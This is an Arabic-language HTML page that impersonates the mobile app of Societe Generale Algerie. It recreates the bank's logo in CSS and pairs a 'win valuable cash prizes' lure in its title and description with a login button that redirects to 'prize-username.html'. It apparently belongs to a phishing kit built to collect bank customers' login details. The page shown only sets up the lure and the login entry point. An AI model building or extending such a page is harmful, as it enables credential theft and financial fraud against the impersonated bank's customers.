<!DOCTYPE html>
<html lang="ar" dir="rtl" data-page="select">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover">
  <link rel="stylesheet" href="/assets/css/no-zoom.css?v=1">
  <script src="/assets/js/no-zoom.js?v=1"></script>
  <meta name="theme-color" content="#c62828">
  <meta name="description" content="سجّل واربح جوائز قيمة مع Societe Generale Algerie">
  <title>اربح جوائز نقدية قيّمة مع Societe Generale Algerie</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
  <script src="/assets/js/site-lang.js?v=1"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: 'Cairo', sans-serif;
      background-color: #ffffff;
      color: #1a1a1a;
      display: flex;
      justify-content: center;
      min-height: 100vh;
      -webkit-font-smoothing: antialiased;
    }

    /* حاوية الصفحة بمقاس يحاكي شاشات الهواتف الذكية ويتوسط الشاشات الكبيرة */
    .app-container {
      width: 100%;
      max-width: 440px;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      padding: 24px 24px 32px 24px;
      background-color: #ffffff;
    }

    /* القسم العلوي: الشعار والعنوان */
    .main-content {
      margin-top: 22vh;
      display: flex;
      flex-direction: column;
      align-items: flex-end;
    }

    /* تنسيق الشعار (Logo) */
    .brand-header {
      display: flex;
      align-items: center;
      gap: 12px;
      direction: ltr;
      margin-bottom: 24px;
    }

    .sg-square {
      width: 52px;
      height: 52px;
      display: flex;
      flex-direction: column;
      flex-shrink: 0;
    }

    .sg-red { background-color: #e60028; height: 46%; width: 100%; }
    .sg-white { background-color: #ffffff; height: 8%; width: 100%; }
    .sg-black { background-color: #000000; height: 46%; width: 100%; }

    .brand-text {
      font-family: Arial, Helvetica, sans-serif;
      font-weight: 800;
      font-size: 13.5px;
      line-height: 1.25;
      color: #000000;
      text-align: right;
      letter-spacing: 0.3px;
    }

    /* قسم النصوص الترحيبية */
    .welcome-section { width: 100%; text-align: right; }

    .welcome-ar {
      font-size: 31px;
      font-weight: 600;
      color: #1e1e1e;
      margin-bottom: 10px;
      line-height: 1.3;
    }

    .welcome-en {
      font-family: Arial, Helvetica, sans-serif;
      font-size: 30px;
      font-weight: 700;
      color: #1e1e1e;
      direction: ltr;
      text-align: right;
      letter-spacing: 0.5px;
    }

    .red-divider {
      width: 145px;
      height: 4.5px;
      background-color: #d91c24;
      border-radius: 3px;
      margin-top: 22px;
      margin-left: auto;
    }

    /* القسم السفلي: الأزرار والروابط */
    .bottom-actions {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 40px;
    }

    .btn {
      width: 100%;
      height: 58px;
      border-radius: 30px;
      font-family: 'Cairo', sans-serif;
      font-size: 19px;
      font-weight: 700;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: transform 0.15s ease, background-color 0.2s ease;
      text-decoration: none;
    }

    .btn:active { transform: scale(0.98); }

    .btn-login {
      background-color: #c8102e;
      color: #ffffff;
      border: none;
      margin-bottom: 16px;
    }

    .btn-login:hover { background-color: #b00e28; }

    .btn-register {
      background-color: #ffffff;
      color: #1a1a1a;
      border: 1.8px solid #1a1a1a;
      margin-bottom: 28px;
    }

    .btn-register:hover { background-color: #f7f7f7; }

    /* قسم المساعدات والخدمات */
    .help-section {
      display: flex;
      flex-direction: column;
      align-items: center;
      cursor: pointer;
      color: #333333;
      user-select: none;
    }

    .chevron-up {
      width: 10px;
      height: 10px;
      border-top: 2px solid #333333;
      border-right: 2px solid #333333;
      transform: rotate(-45deg);
      margin-bottom: 6px;
      transition: transform 0.2s ease;
    }

    .help-text { font-size: 14.5px; font-weight: 600; color: #333333; }

    /* اللغة الإنجليزية/الفرنسية: اتجاه من اليسار لليمين */
    html[dir="ltr"] .main-content { align-items: flex-start; }
    html[dir="ltr"] .welcome-section { text-align: left; }
    html[dir="ltr"] .welcome-ar { font-size: 28px; }
    html[dir="ltr"] .welcome-en { text-align: left; }
    html[dir="ltr"] .red-divider { margin-left: 0; margin-right: auto; }
  </style>
</head>
<body>
  <div class="app-container">
    <!-- المحتوى العلوي -->
    <div class="main-content">
      <!-- شعار البنك -->
      <div class="brand-header">
        <div class="sg-square">
          <div class="sg-red"></div>
          <div class="sg-white"></div>
          <div class="sg-black"></div>
        </div>
        <div class="brand-text">
          SOCIETE GENERALE<br>
          ALGERIE
        </div>
      </div>

      <!-- نصوص الترحيب -->
      <div class="welcome-section">
        <h1 class="welcome-ar" data-i18n="select.welcome">مرحبًا بك على تطبيق</h1>
        <div class="welcome-en" data-i18n="select.appName">APPLI SGA</div>
        <div class="red-divider"></div>
      </div>
    </div>

    <!-- الأزرار السفلية -->
    <div class="bottom-actions">
      <button type="button" id="loginBtn" class="btn btn-login" data-i18n="select.login">تسجيل الدخول</button>
      <button type="button" id="registerBtn" class="btn btn-register" data-i18n="select.register">طلب الاشتراك</button>

      <div class="help-section" id="helpBtn">
        <span class="chevron-up"></span>
        <span class="help-text" data-i18n="select.help">المساعدات والخدمات</span>
      </div>
    </div>
  </div>

  <script>
    // التوجيه إلى صفحة prize-username.html عند النقر على زر تسجيل الدخول
    document.getElementById('loginBtn').addEventListener('click', function () {
      window.location.href = window.SiteLang ? SiteLang.href('prize-username.html') : 'prize-username.html';
    });

    // يمكنك إضافة وظيفة لزر طلب الاشتراك أو المساعدات هنا مستقبلاً
    document.getElementById('registerBtn').addEventListener('click', function () {
      // الإجراء المطلوب لطلب الاشتراك
    });
  </script>
</body>
</html>
